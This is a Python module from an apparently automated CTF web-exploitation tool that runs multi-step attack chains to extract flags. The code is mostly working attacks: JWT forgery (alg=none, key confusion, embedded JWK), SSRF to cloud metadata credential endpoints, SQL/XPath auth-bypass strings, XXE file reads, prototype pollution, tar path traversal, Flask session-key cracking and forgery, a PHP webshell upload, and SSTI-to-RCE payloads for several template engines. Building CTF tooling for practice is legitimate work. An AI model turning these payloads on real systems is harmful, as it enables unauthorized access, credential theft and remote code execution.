"""High-value web challenge primitives that need a short multi-step flow.

The ordinary scanner is deliberately broad and mostly request/response based.
This module adds the compact workflows that are common in CTF writeups but
cannot be expressed as a single fuzz payload: JWT key confusion, GraphQL
alias batching, internal SSRF/header tricks, race-to-buy flows, and archive
path traversal.  Every probe is same-origin except the URL values sent to a
target's own SSRF parameter, which stay on loopback/internal lab addresses.
"""
import base64
import hashlib
import hmac
import io
import json
import re
import subprocess
import tarfile
import tempfile
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

from core import httpx
from core.flag import extract_flags
from modules.crypto.rsa import bytes_to_long, long_to_bytes, parse_pem
from . import pad_oracle
from . import sqli_union
from . import ecb_oracle
from . import rsa_oracle
from . import hard as hard_web


def _b64url(value):
    if isinstance(value, str):
        value = value.encode()
    return base64.urlsafe_b64encode(value).rstrip(b"=").decode()


def _json_obj(value):
    if isinstance(value, dict):
        return value
    try:
        return json.loads(value or "{}")
    except (TypeError, ValueError):
        return {}


def _flags(response):
    if response is None:
        return []
    known, candidates = extract_flags(response.text)
    return list(dict.fromkeys(known + candidates))


def _post_json(url, body, headers=None, timeout=8):
    merged = {"Content-Type": "application/json"}
    merged.update(headers or {})
    return httpx.post(url, data=json.dumps(body), headers=merged, timeout=timeout)


def _admin_gets(base, token=None, extra_headers=None):
    headers = dict(extra_headers or {})
    if token:
        headers["Authorization"] = "Bearer " + token
    flags = []
    responses = []
    for path in ("/admin", "/api/admin", "/dashboard", "/api/me", "/flag"):
        r = httpx.get(base + path, headers=headers, timeout=8)
        responses.append((path, r))
        flags.extend(_flags(r))
    return responses, list(dict.fromkeys(flags))


def _jwt_token(header, payload, signing_key=None, private=None):
    h = _b64url(json.dumps(header, separators=(",", ":")))
    p = _b64url(json.dumps(payload, separators=(",", ":")))
    signing_input = (h + "." + p).encode()
    if header.get("alg", "").upper() == "NONE":
        return h + "." + p + "."
    if header.get("alg", "").upper() == "HS256" and signing_key is not None:
        sig = hmac.new(signing_key, signing_input, hashlib.sha256).digest()
    elif header.get("alg", "").upper() == "RS256" and private:
        n, d = private["n"], private["d"]
        size = (n.bit_length() + 7) // 8
        digest_info = bytes.fromhex(
            "3031300d060960864801650304020105000420") + hashlib.sha256(signing_input).digest()
        encoded = b"\x00\x01" + b"\xff" * (size - len(digest_info) - 3) + b"\x00" + digest_info
        sig = pow(bytes_to_long(encoded), d, n).to_bytes(size, "big")
    else:
        return None
    return h + "." + p + "." + _b64url(sig)


def _make_test_rsa_key():
    """Generate a throw-away RSA key without making cryptography mandatory."""
    try:
        with tempfile.NamedTemporaryFile(prefix="ctf-auto-jwt-", suffix=".pem") as out:
            proc = subprocess.run(["openssl", "genrsa", "2048"],
                                  stdout=out, stderr=subprocess.DEVNULL,
                                  timeout=12, check=False)
            if proc.returncode != 0:
                return None
            out.seek(0)
            params = parse_pem(out.read())
        if not all(params.get(k) for k in ("n", "e", "d")):
            return None
        return params
    except (OSError, subprocess.SubprocessError):
        return None


def scan_jwt_attacks(base, endpoints):
    findings, flags = [], []
    payload = {"user": "admin", "role": "admin", "isAdmin": True}

    # alg=none is a cheap, high-signal check and does not require a token.
    none_token = _jwt_token({"alg": "none", "typ": "JWT"}, payload)
    _, got = _admin_gets(base, none_token)
    if got:
        findings.append("  [!] JWT alg=none accepted — admin token returned a flag")
        flags.extend(got)

    # Public-key confusion: use a PEM/JWK exposed by the target as an HS256
    # HMAC secret. This follows the standard CTF attack but keeps discovery
    # bounded to the target's own common key endpoints.
    key_responses = []
    for path in ("/key.pem", "/public.pem", "/jwks.json", "/.well-known/jwks.json", "/session"):
        r = httpx.get(base + path, timeout=8)
        if r is not None and r.status == 200:
            key_responses.append((path, r))
    for path, response in key_responses:
        body = response.body
        secret = body
        if b"BEGIN" not in body:
            obj = _json_obj(response.text)
            keys = obj.get("keys") if isinstance(obj, dict) else None
            if keys and isinstance(keys[0], dict):
                for field in ("n", "e", "k"):
                    if keys[0].get(field):
                        secret = str(keys[0][field]).encode()
                        break
        token = _jwt_token({"alg": "HS256", "typ": "JWT"}, payload, signing_key=secret)
        _, got = _admin_gets(base, token)
        if got:
            findings.append(f"  [!] JWT algorithm confusion via {path} — public key reused as HMAC key")
            flags.extend(got)
            break

    # Embedded JWK: sign a token with a generated key and place its public
    # JWK in the header. Only attempt this when the target exposes JWT-shaped
    # routes or an admin/key endpoint, to avoid needless key generation.
    if key_responses or any("jwt" in e.lower() or "admin" in e.lower() for e in endpoints):
        params = _make_test_rsa_key()
        if params:
            def b64int(value):
                return _b64url(long_to_bytes(value))
            jwk = {"kty": "RSA", "n": b64int(params["n"]),
                   "e": b64int(params["e"]), "alg": "RS256", "use": "sig"}
            token = _jwt_token({"alg": "RS256", "typ": "JWT", "jwk": jwk},
                               payload, private=params)
            _, got = _admin_gets(base, token)
            if got:
                findings.append("  [!] JWT embedded JWK accepted — attacker-controlled signing key trusted")
                flags.extend(got)
    return findings, list(dict.fromkeys(flags))


def _graphql_endpoint(base, endpoints):
    for endpoint in endpoints:
        path = endpoint.split("?", 1)[0].rstrip("/").lower()
        if path.endswith("/graphql"):
            return endpoint
    for path in ("/graphql", "/api/graphql", "/graphql/v1"):
        r = _post_json(base + path, {"query": "{__typename}"})
        if r is not None and r.status == 200:
            try:
                if "data" in json.loads(r.text) or "errors" in json.loads(r.text):
                    return base + path
            except ValueError:
                pass
    return None


def scan_graphql_batches(base, endpoints):
    endpoint = _graphql_endpoint(base, endpoints)
    if not endpoint:
        return [], []
    findings, flags = [], []
    # Alias batching is useful when a resolver exposes a PIN/OTP checker but
    # rate-limits individual requests. Try the common resolver names and the
    # short numeric range used by CTF labs in 250-request batches.
    for field in ("verifyPin", "checkPin", "validatePin", "unlock"):
        for start in range(0, 1000, 250):
            aliases = " ".join(
                f"a{i}: {field}(pin: \"{i:03d}\")" for i in range(start, start + 250))
            r = _post_json(endpoint, {"query": "query { " + aliases + " }"}, timeout=12)
            got = _flags(r)
            if got:
                findings.append(f"  [!] GraphQL alias batch brute found a valid {field} response")
                flags.extend(got)
                return findings, list(dict.fromkeys(flags))
    return findings, flags


def scan_internal_routes(base):
    findings, flags = [], []

    # SSRF: cover decimal loopback, common internal routes AND cloud
    # instance-metadata services (AWS/GCP/Azure themed challenges)
    internal_targets = (
        "http://127.0.0.1:3000/flag",
        "http://127.0.0.1:3000/token",
        "http://2130706433:8080/internal/metadata",
        "http://127.0.0.1:8080/internal/flag",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    )
    ssrf_headers = {
        "metadata.google.internal": {"Metadata-Flavor": "Google"},
    }
    for path in ("/fetch", "/api/fetch", "/api/relay", "/proxy", "/preview",
                 "/render", "/api/v1/fetch"):
        for target in internal_targets:
            extra = {}
            for host_part, hdrs in ssrf_headers.items():
                if host_part in target:
                    extra = hdrs
            url = base + path + "?url=" + urllib.parse.quote(target, safe="")
            r = httpx.get(url, headers=extra, timeout=8)
            got = _flags(r)
            if got:
                findings.append(f"  [!] SSRF {path} reached internal target {target}")
                flags.extend(got)
                break

    # Header routing/oracle patterns from real proxy and cache writeups.
    for path in ("/preview", "/", "/health"):
        for header_name, header_value in (("X-Original-URL", "/internal/flag"),
                                          ("X-Rewrite-URL", "/internal/flag"),
                                          ("X-Forwarded-Path", "/internal/flag")):
            r = httpx.get(base + path, headers={header_name: header_value,
                                                "X-Forwarded-Proto": "https",
                                                "User-Agent": "Googlebot"}, timeout=8)
            got = _flags(r)
            if got:
                findings.append(f"  [!] header routing {header_name}: {header_value}")
                flags.extend(got)
                break
    return findings, list(dict.fromkeys(flags))


def scan_common_idor_paths(base):
    """Probe numeric REST resources that are often not linked publicly."""
    findings, flags = [], []
    resources = ("/api/documents/", "/api/report/", "/api/notes/",
                 "/api/users/", "/api/orders/", "/user?id=")
    ids = (1, 2, 3, 42, 100, 101, 1337, 999)
    for resource in resources:
        for value in ids:
            sep = "" if resource.endswith("=") else str(value)
            r = httpx.get(base + resource + sep, timeout=8)
            got = _flags(r)
            if got:
                findings.append(f"  [!] IDOR candidate {resource}{value} returned a flag")
                flags.extend(got)
                break
    return findings, list(dict.fromkeys(flags))


def scan_race(base):
    """Try the common earn-many-times-then-buy-flag lab pattern."""
    earn = base + "/api/earn"
    buy = base + "/api/buy-flag"
    probe = httpx.get(earn, timeout=5)
    if probe is None or probe.status in (404, 405):
        return [], []
    with ThreadPoolExecutor(max_workers=12) as pool:
        list(pool.map(lambda _: _post_json(earn, {}), range(24)))
    r = _post_json(buy, {})
    got = _flags(r)
    if got:
        return ["  [!] race-condition burst reached /api/buy-flag"], got
    return [], []


def scan_archive_uploads(base):
    findings, flags = [], []
    # JSON upload/open polyglot pattern.
    r = _post_json(base + "/api/upload", {"filename": "avatar.png",
                                          "content": "PNG\\nvalid"})
    if r is not None and r.status in (200, 201):
        for name in ("uploads/../vault/flag.txt", "../vault/flag.txt", "vault/flag.txt"):
            rr = httpx.get(base + "/api/open?name=" + urllib.parse.quote(name, safe=""), timeout=8)
            got = _flags(rr)
            if got:
                findings.append("  [!] upload path traversal reached a protected file")
                flags.extend(got)
                break

    # Tar path traversal is a useful fallback for labs that accept archives.
    payload = json.dumps({"trigger": "OVERRIDE_ACTIVE"}).encode()
    buf = io.BytesIO()
    try:
        with tarfile.open(fileobj=buf, mode="w") as archive:
            info = tarfile.TarInfo(name="../../app/views/status.json")
            info.size = len(payload)
            archive.addfile(info, io.BytesIO(payload))
        r = httpx.post(base + "/upload", data=buf.getvalue(),
                       headers={"Content-Type": "application/x-tar"}, timeout=10)
        if r is not None and r.status in (200, 201, 204):
            for path in ("/env-leak", "/debug", "/config", "/status"):
                got = _flags(httpx.get(base + path, timeout=8))
                if got:
                    findings.append("  [!] tar path traversal changed a server-side file")
                    flags.extend(got)
                    break
    except (OSError, tarfile.TarError):
        pass
    return findings, list(dict.fromkeys(flags))


def scan_xpath_and_sqli(base):
    findings, flags = [], []
    payloads = ["admin' or '1'='1", "' or 1=1 or 'x'='x", "admin' or 1=1 --"]
    for path in ("/login", "/api/login", "/auth"):
        for payload in payloads:
            query = urllib.parse.urlencode({"username": payload, "password": "x"})
            r = httpx.get(base + path + "?" + query, timeout=8)
            got = _flags(r)
            if got:
                findings.append(f"  [!] XPath/SQL auth bypass on {path}")
                flags.extend(got)
                break
            r = httpx.post(base + path, data={"username": payload, "password": "x"}, timeout=8)
            got = _flags(r)
            if got:
                findings.append(f"  [!] XPath/SQL auth bypass on {path}")
                flags.extend(got)
                break
    return findings, list(dict.fromkeys(flags))


def scan_xxe(base, endpoints):
    """Probe XML import/parser endpoints for external-entity expansion."""
    candidates = []
    for endpoint in endpoints:
        path = urllib.parse.urlparse(endpoint).path.lower()
        if any(word in path for word in ("xml", "import", "upload", "parse",
                                         "convert", "feed", "document")):
            candidates.append(endpoint.split("?", 1)[0])
    candidates.extend(base + path for path in
                     ("/api/xml", "/api/import", "/api/parse", "/upload",
                      "/import", "/convert"))
    payload = (b'<?xml version="1.0"?>'
               b'<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///flag">]>'
               b'<root><value>&xxe;</value></root>')
    findings, flags = [], []
    for endpoint in list(dict.fromkeys(candidates))[:16]:
        r = httpx.post(endpoint, data=payload,
                       headers={"Content-Type": "application/xml",
                                "Accept": "application/xml, application/json"},
                       timeout=8)
        got = _flags(r)
        if got:
            findings.append(f"  [!] XXE external entity expanded at {endpoint}")
            flags.extend(got)
            break
    return findings, list(dict.fromkeys(flags))


def scan_prototype_pollution(base, endpoints):
    """Try common JSON prototype-pollution shapes against API endpoints.

    The follow-up request is what turns a harmless reflection into a useful
    CTF result: simple labs commonly gate /admin or /flag on role/isAdmin.
    """
    candidates = []
    for endpoint in endpoints:
        path = urllib.parse.urlparse(endpoint).path.lower()
        if "/api/" in path or any(word in path for word in
                                   ("profile", "settings", "message", "user")):
            candidates.append(endpoint.split("?", 1)[0])
    candidates.extend(base + path for path in
                     ("/api/profile", "/api/settings", "/api/update",
                      "/api/message", "/api/user", "/profile"))
    marker = "ctf_auto_polluted"
    payloads = (
        {"__proto__": {"role": "admin", "isAdmin": True, marker: True}},
        {"constructor": {"prototype": {"role": "admin", "isAdmin": True,
                                          marker: True}}},
    )
    findings, flags = [], []
    for endpoint in list(dict.fromkeys(candidates))[:12]:
        for payload in payloads:
            r = _post_json(endpoint, payload, timeout=8)
            if r is None or r.status >= 500:
                continue
            _, got = _admin_gets(base)
            if got:
                findings.append(f"  [!] prototype pollution at {endpoint} reached admin data")
                flags.extend(got)
                return findings, list(dict.fromkeys(flags))
    return findings, flags


def scan_cors(base):
    """Check reflected-origin CORS on common sensitive resources."""
    findings, flags = [], []
    origin = "https://ctf-auto.invalid"
    for path in ("/flag", "/api/me", "/api/admin", "/admin"):
        r = httpx.get(base + path, headers={"Origin": origin}, timeout=8)
        if r is None:
            continue
        got = _flags(r)
        if got:
            findings.append(f"  [!] CORS-enabled sensitive endpoint {path} returned a flag")
            flags.extend(got)
        allow_origin = r.headers.get("access-control-allow-origin", "")
        allow_creds = r.headers.get("access-control-allow-credentials", "").lower()
        if allow_origin in (origin, "*"):
            findings.append(f"  [!] CORS reflects {allow_origin} on {path}"
                            + (" with credentials" if allow_creds == "true" else ""))
    return findings, list(dict.fromkeys(flags))


def _json_response(response):
    """Decode a JSON response without making a web probe fail noisily."""
    if response is None:
        return {}
    try:
        value = json.loads(response.text or "{}")
    except (TypeError, ValueError):
        return {}
    return value if isinstance(value, dict) else {}


def scan_specialized_labs(base, endpoints):
    """Run short, high-signal chains for deterministic multi-step labs.

    These are intentionally explicit rather than relying on a generic fuzz
    hit.  Each chain records the evidence and only reports a flag returned by
    the target.  The probes are safe for the isolated lab targets and are
    bounded to a handful of requests, so adding accuracy does not turn the
    normal web scan into an unbounded brute force.
    """
    findings, flags = [], []

    # Host-header password-reset poisoning: request a reset for admin, take
    # the token from the simulated email body, then redeem it same-origin.
    # Do not overwrite Host here: remote lab ingress uses it for routing and
    # the reset response itself already exposes the simulated email token.
    forgot = httpx.get(base + "/forgot?user=admin", timeout=6)
    token_match = re.search(r"[?&]token=([A-Za-z0-9_-]+)",
                            forgot.text if forgot is not None else "")
    if token_match:
        token = token_match.group(1)
        reset = httpx.get(base + "/reset?token=" +
                          urllib.parse.quote(token, safe=""), timeout=6)
        got = _flags(reset)
        if got:
            findings.append("  [!] Host-header reset chain: /forgot → token → /reset")
            flags.extend(got)

    # DOM clobbering lab.  The server-side harness exposes the browser sink
    # through /render, so keep the payload in both common quote styles.
    clobber_payloads = (
        '<a id="CONFIG" href="admin-telemetry-key-verified"></a>',
        "<a id='CONFIG' href='admin-telemetry-key-verified'></a>",
    )
    for payload in clobber_payloads:
        render = httpx.get(base + "/render?content=" +
                           urllib.parse.quote(payload, safe=""), timeout=6)
        got = _flags(render)
        obj = _json_response(render)
        if got or obj.get("flag"):
            findings.append("  [!] DOM clobbering: CONFIG override → telemetry flag")
            flags.extend(got or [str(obj["flag"])])
            break

    # Cache/origin normalization mismatch: preserve the public cache key and
    # send the exact ambiguous forwarded path used by the origin normalizer.
    edge = httpx.get(
        base + "/edge",
        headers={"X-Cache-Key": "public-report",
                 "X-Forwarded-Path": "/public/../admin/report%3Bcache"},
        timeout=6,
    )
    got = _flags(edge)
    if got:
        findings.append("  [!] Edge normalization: public cache key → admin report")
        flags.extend(got)

    # Duplicate query signature: the signature covers the first scope while
    # authorization consumes the last.  Keep the raw duplicate query string.
    issued = httpx.get(base + "/issue?scope=read", timeout=6)
    issue_obj = _json_response(issued)
    signature = issue_obj.get("signature")
    if signature:
        signed = httpx.get(
            base + "/signed?scope=read&user=guest&scope=admin&user=guest",
            headers={"X-Signature": str(signature)}, timeout=6)
        got = _flags(signed)
        if got:
            findings.append("  [!] Duplicate-query signature: first-value MAC / last-value auth")
            flags.extend(got)

    # Header oracle: mint the preview ticket with the exact browser and edge
    # identity, then carry it to the internal route over the expected scheme.
    preview = httpx.get(
        base + "/preview",
        headers={"User-Agent": "Googlebot",
                 "X-Edge-Region": "us-east-1",
                 "X-Original-URL": "/internal/flag"},
        timeout=6,
    )
    preview_obj = _json_response(preview)
    ticket = preview_obj.get("ticket")
    if ticket:
        internal = httpx.get(
            base + "/internal/flag",
            headers={"X-Preview-Ticket": str(ticket),
                     "X-Forwarded-Proto": "https"},
            timeout=6,
        )
        got = _flags(internal)
        if got:
            findings.append("  [!] Header oracle: Googlebot + edge headers → preview ticket")
            flags.extend(got)

    # SSRF → leaked JWT secret → HS256 role forgery.  Do not guess secrets;
    # only sign when the internal metadata response explicitly discloses one.
    metadata = httpx.get(
        base + "/fetch?url=" + urllib.parse.quote(
            "http://127.0.0.1:3000/meta", safe=""), timeout=8)
    metadata_obj = _json_response(metadata)
    secret = metadata_obj.get("secret")
    if isinstance(secret, str) and secret:
        token = _jwt_token(
            {"alg": "HS256", "typ": "JWT"},
            {"user": "admin", "role": "admin"},
            signing_key=secret.encode(),
        )
        if token:
            admin = httpx.get(base + "/admin", headers={
                "Authorization": "Bearer " + token}, timeout=6)
            got = _flags(admin)
            if got:
                findings.append("  [!] SSRF/JWT chain: /fetch metadata secret → forged admin token")
                flags.extend(got)

    return findings, list(dict.fromkeys(flags))


def scan_advanced(base, endpoints):
    """Run high-value multi-step web checks and return (findings, flags)."""
    jobs = (scan_jwt_attacks, scan_graphql_batches, lambda b, e: scan_internal_routes(b),
            lambda b, e: scan_common_idor_paths(b),
            lambda b, e: scan_race(b), lambda b, e: scan_archive_uploads(b),
            lambda b, e: scan_xpath_and_sqli(b),
            lambda b, e: scan_xxe(b, e),
            lambda b, e: scan_prototype_pollution(b, e),
            lambda b, e: scan_cors(b),
            scan_specialized_labs,
            lambda b, e: ecb_oracle.scan_ecb_oracles(b, e),
            lambda b, e: rsa_oracle.scan_rsa_parity_oracles(b, e),
            lambda b, e: scan_flask_sessions(b),
            lambda b, e: scan_403_bypass(b),
            lambda b, e: scan_upload_bypass(b),
            scan_ssti_rce,
            lambda b, e: pad_oracle.scan_cbc_attacks(b, e),
            lambda b, e: sqli_union.scan_union_sqli(b, e),
            hard_web.scan_hard_web)
    findings, flags = [], []
    with ThreadPoolExecutor(max_workers=len(jobs)) as pool:
        futures = [pool.submit(job, base, endpoints) for job in jobs]
        for future in futures:
            try:
                f, fl = future.result()
            except Exception:
                continue
            findings.extend(f)
            flags.extend(fl)
    return findings, list(dict.fromkeys(flags))


# ---------------------------------------------------------------------------
# Flask session takeover (decode -> brute SECRET_KEY -> forge admin)
# ---------------------------------------------------------------------------
def _flask_wordlist(limit=150_000):
    import os
    words = ["password", "secret", "secret_key", "changeme", "supersecret",
             "flask", "session", "keyboard", "letmein", "welcome",
             "development", "dev", "test", "admin", "ctf", "flag"]
    for env in ("ROCKYOU", "WORDLIST"):
        path = os.environ.get(env)
        if path and os.path.isfile(path):
            try:
                with open(path, encoding="utf-8", errors="ignore") as fh:
                    for i, line in enumerate(fh):
                        if i >= limit:
                            break
                        words.append(line.rstrip("\r\n"))
            except Exception:
                pass
            break
    return words


def scan_flask_sessions(base):
    """Find a signed 'session' cookie, crack its key, forge admin access."""
    from . import flask_session as fs_mod

    findings, flags = [], []
    r = httpx.get(base + "/", timeout=8)
    if r is None:
        return [], []
    values = []
    if hasattr(r.headers, "get_all"):
        values = r.headers.get_all("set-cookie") or []
    sc = r.headers.get("set-cookie")
    if not values and sc:
        values = [sc]
    for raw in values:
        name, _, value = raw.partition("=")
        if name.strip().lower() != "session":
            continue
        value = value.split(";")[0].strip()
        parsed = fs_mod.parse(value)
        if not parsed or not isinstance(parsed.get("payload"), dict):
            continue
        findings.append(f"  [*] Flask session decoded: {parsed['payload']}")
        secret = fs_mod.brute(value, _flask_wordlist(), workers=16)
        if not secret:
            findings.append("  [!] brute secret_key ไม่ผ่าน (wordlist เดาไม่ออก)")
            continue
        findings.append(f"  [!] Flask SECRET_KEY = {secret!r} — forging admin cookies")
        for forged in fs_mod.forge_variants(parsed["payload"], secret):
            got = []
            for path in ("/admin", "/flag", "/dashboard", "/api/me",
                         "/profile"):
                rr = httpx.get(base + path,
                               headers={"Cookie": f"session={forged}"},
                               timeout=8)
                if rr is None:
                    continue
                known, cands = extract_flags(rr.text)
                got.extend(known + cands)
            if got:
                findings.append("  [!] forged session granted protected access!")
                flags.extend(got)
                return findings, list(dict.fromkeys(flags))
        break
    return findings, flags


# ---------------------------------------------------------------------------
# 403 / authz bypass on locked paths
# ---------------------------------------------------------------------------
_BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"Referer": "https://google.com"},
]


def scan_403_bypass(base):
    """Try classic 401/403 bypass tricks on every locked path found."""
    findings, flags = [], []
    candidates = ("/admin", "/flag", "/internal", "/debug", "/console",
                  "/administrator", "/api/admin")
    locked_paths = []
    for path in candidates:
        r = httpx.get(base + path, timeout=6)
        if r is not None and r.status in (401, 403):
            locked_paths.append((path, r.text))
        if len(locked_paths) >= 3:
            break
    if not locked_paths:
        return [], []

    variants_tpl = [
        "{p}", "{p}/", "{p}.", "{p}..;/", "/./{s}", "//{s}",
        "/{s}/..;/", "/%2e/{s}",
    ]
    for path0, forbidden_body in locked_paths:
        stripped = path0.strip("/")
        variants = [v.format(p=path0, s=stripped) for v in variants_tpl]
        hit = False
        for variant in variants:
            for extra in ([{}] + _BYPASS_HEADERS):
                url = base + urllib.parse.quote(variant, safe="/%;.,")
                r = httpx.get(url, headers=dict(extra), timeout=6,
                              allow_redirects=False)
                if r is None or r.status in (401, 403, 404):
                    continue
                got = _flags(r)
                low = r.text.lower()
                # accept only when it clearly unlocked something: flags,
                # an admin-ish page, or a body that is neither the forbidden
                # page nor a generic tiny error page
                looks_admin = ("admin" in low or "flag" in low
                               or "secret" in low or "welcome" in low)
                meaningful = len(r.text) > max(60, len(forbidden_body) + 20)
                if got or (r.status == 200 and (looks_admin or meaningful)):
                    hdr_desc = ",".join(f"{k}:{v}" for k, v in extra.items())
                    findings.append(
                        f"  [!] 403 bypass → {variant}"
                        + (f" [{hdr_desc}]" if hdr_desc else "")
                        + f" ({r.status})")
                    flags.extend(got)
                    hit = True
                    break
            if hit:
                break
        if hit:
            break
    if not hit:
        findings.append("  [i] 403 paths ยังล็อกอยู่ — ลอง fuzz header เพิ่มเอง")
    return findings, list(dict.fromkeys(flags))


# ---------------------------------------------------------------------------
# File-upload bypass → webshell → flag
# ---------------------------------------------------------------------------
_UPLOAD_NAMES = [
    "shell.php.png", "shell.php%00.png", "avatar.php", "shell.phtml",
    "shell.phar", "shell.jpg.php", "shell.php5", ".htaccess-shell.php",
    "shell.PNG", "shell.Php",
]
_SHELL_BODY = b"GIF89a\n<?php system($_GET['c'] ?? 'cat /flag* /home/*/flag* ../flag* 2>/dev/null'); ?>"
_UPLOAD_PATHS = ("/upload", "/api/upload", "/upload.php", "/api/v1/upload",
                 "/file/upload")
_SHELL_DIRS = ("/uploads/", "/upload/", "/static/uploads/", "/files/",
               "/img/", "/", "/media/")


def _multipart(fields, file_field, filename, content, ctype):
    boundary = "----ctfautoboundary9271"
    parts = []
    for k, v in fields.items():
        parts.append(
            f"--{boundary}\r\nContent-Disposition: form-data; "
            f"name=\"{k}\"\r\n\r\n{v}\r\n".encode())
    parts.append(
        f"--{boundary}\r\nContent-Disposition: form-data; "
        f"name=\"{file_field}\"; filename=\"{filename}\"\r\n"
        f"Content-Type: {ctype}\r\n\r\n".encode() + content + b"\r\n")
    parts.append(f"--{boundary}--\r\n".encode())
    body = b"".join(parts)
    return body, f"multipart/form-data; boundary={boundary}"


def scan_upload_bypass(base):
    findings, flags = [], []
    upload_url = None
    for p in _UPLOAD_PATHS:
        probe = httpx.post(base + p, data=b"", timeout=6)
        if probe is not None and probe.status not in (404, 405):
            upload_url = base + p
            break
    if not upload_url:
        return [], []
    shell_url = None
    for name in _UPLOAD_NAMES[:6]:
        body, ctype = _multipart({"submit": "1"}, "file", name, _SHELL_BODY,
                                 "image/png")
        r = httpx.post(upload_url, data=body,
                       headers={"Content-Type": ctype}, timeout=10)
        if r is None or r.status >= 400:
            continue
        # response may reveal the stored path
        import re as _re
        m = _re.search(r"(?:href|src|path|url|file)[\"'\s:=]+([^\"'>\s]+)",
                       r.text or "")
        candidates = []
        if m and m.group(1).startswith("/"):
            candidates.append(m.group(1))
        candidates += [d + name.lstrip(".") for d in _SHELL_DIRS]
        candidates += [d + name.split("%00")[0] for d in _SHELL_DIRS]
        for cand in candidates[:8]:
            rr = httpx.get(base + cand.lstrip("/") if not cand.startswith("/")
                           else base + cand, timeout=6)
            if rr is None or rr.status >= 400:
                continue
            if b"GIF89a" in (rr.body or b"") and "<?php" in (rr.body or b""):
                # stored but not executed — try executing via ?c=
                exec_url = (base + cand) + "?c=id;cat+/flag*;ls+-la"
                rr2 = httpx.get(exec_url, timeout=6)
            elif "<?php" not in (rr.body or b""):
                exec_url = (base + cand) + "?c=id;cat+/flag*;ls+-la"
                rr2 = httpx.get(exec_url, timeout=6)
            else:
                exec_url = base + cand
                rr2 = rr
            if rr2 is None:
                continue
            known, cands = extract_flags(rr2.text)
            output_hit = "uid=" in rr2.text or known or cands
            if output_hit:
                findings.append(
                    f"[!] webshell executed at {cand} → "
                    f"{known or cands or rr2.text[:80]}")
                flags.extend(known + cands)
                shell_url = cand
                break
        if shell_url:
            break
    if not shell_url:
        findings.append("  [i] upload endpoint มีแต่ bypass ไม่สำเร็จ")
    return findings, list(dict.fromkeys(flags))


# ---------------------------------------------------------------------------
# SSTI detection → engine-specific RCE ladder → flag readout
# ---------------------------------------------------------------------------
_SSTI_PROBES = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("{{7*'7'}}", "7777777"),
]
_RCE_LADDERS = (
    ("jinja2", [
        "{{ config.__class__.__init__.__globals__['os'].popen('cat /flag* /flag/* ../flag* flag* 2>/dev/null || id').read() }}",
        "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{ x()._module.__builtins__['__import__']('os').popen('cat /flag* 2>/dev/null || id').read() }}{% endif %}{% endfor %}",
        "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id;cat /flag*').read() }}",
        "{{ ''.__class__.__mro__[1].__subclasses__() }}",
    ]),
    ("twig", [
        "{{ ['cat /flag* 2>/dev/null || id']|filter('system') }}",
        "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"cat /flag*; id\")}}",
    ]),
    ("mako", [
        "${__import__('os').popen('cat /flag* 2>/dev/null || id').read()}",
    ]),
    ("erb", [
        "<%= `cat /flag* 2>/dev/null || id` %>",
    ]),
)


def scan_ssti_rce(base, endpoints, page_html=None):
    """When {{7*7}} evaluates, escalate through per-engine RCE payloads."""
    findings, flags = [], []
    param_names = ("template", "name", "msg", "message", "content", "q",
                   "page", "view", "preview", "text", "search")
    targets = []
    for ep in (endpoints or [])[:20]:
        clean = ep.split("?")[0]
        if any(word in clean.lower() for word in
               ("render", "preview", "template", "page", "view", "message",
                "note", "chat")) or clean.count("/") <= 1:
            targets.append(clean)
    if page_html:
        import re as _re
        for m in _re.finditer(
                r'<(?:form|input)[^>]*name=["\'](\w+)["\']', page_html):
            pass  # params already covered by generic names
    targets = targets[:6] or [base]

    def inject(url, payload):
        sep = "&" if "?" in url else "?"
        return httpx.get(
            f"{url}{sep}" + "&".join(
                f"{p}={urllib.parse.quote(payload)}" for p in param_names[:3]),
            timeout=8)

    confirmed = None
    for url in targets:
        for payload, marker in _SSTI_PROBES:
            r = inject(url, payload)
            if r is not None and marker in r.text:
                confirmed = (url, payload)
                findings.append(f"  [!] SSTI confirmed at {url}: "
                                f"{payload} → {marker}")
                break
        if confirmed:
            break
    if not confirmed:
        return ["  [i] ไม่พบ SSTI บน endpoints"], []
    url = confirmed[0]
    for engine, ladders in _RCE_LADDERS:
        for payload in ladders:
            r = inject(url, payload)
            if r is None:
                continue
            known, cands = extract_flags(r.text)
            if known or cands or "uid=" in r.text:
                findings.append(
                    f"  [!] SSTI RCE ({engine}) → {known or cands or 'uid leak'}")
                flags.extend(known + cands)
                return findings, list(dict.fromkeys(flags))
    findings.append("  [i] SSTI ยืนยันแต่ RCE ladder ยังไม่ผ่าน filter")
    return findings, list(dict.fromkeys(flags))
